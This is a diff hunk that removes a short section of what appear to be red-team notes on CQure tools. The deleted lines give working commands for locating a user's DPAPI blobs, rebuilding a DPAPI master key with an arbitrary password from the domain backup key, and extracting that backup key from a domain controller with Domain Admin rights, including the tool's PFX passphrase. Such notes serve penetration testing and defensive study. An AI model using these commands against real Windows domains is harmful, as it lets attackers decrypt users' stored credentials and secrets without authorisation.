@@ -1,9 +1,0 @@
-- CQure
-	- Search for DPAPI blob - note mkguid
-		- `CQDPAPIBlobSearcher.exe /d C:\Users\chajoh\AppData\Roaming /r /o C:\Windows\Temp\Blob`
-	- Re-build master key with arbitrary password using domain backup key
-		- `CQMasterKeyAD.exe /file "C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\<SID>\<mkguid>" /pfx backupKey.pfx /newhash <NTLM hash of arbitrary password>`
-		- NOTE: CQMasterKeyAD.exe assumes the pfx file is packed with passphrase "cqure"; if it is not, repack it accordingly (see Mimikatz section)
-	- Extract domain backup key from DC (requires Domain Admin)
-		- `CQLsassSecretsDumper.exe /file backupKey.pfx`
-		- Note: PFX is packed with passphrase "cqure"
